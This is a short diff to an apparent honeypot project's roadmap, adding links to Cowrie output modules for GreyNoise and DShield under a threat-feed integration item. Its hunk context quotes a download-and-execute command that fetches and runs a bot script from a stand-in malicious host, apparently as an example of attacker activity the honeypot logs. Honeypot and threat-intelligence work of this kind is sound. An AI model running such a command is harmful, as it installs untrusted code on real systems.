@@ -174,6 +174,8 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 - [ ] Export to STIX/TAXII format
 - [ ] Integration with MISP
 - [ ] Contribute to community threat feeds
+  - https://github.com/cowrie/cowrie/blob/main/src/cowrie/output/greynoise.py
+  - https://github.com/cowrie/cowrie/blob/main/src/cowrie/output/dshield.py
 
 ## Future: Security Hardening
 
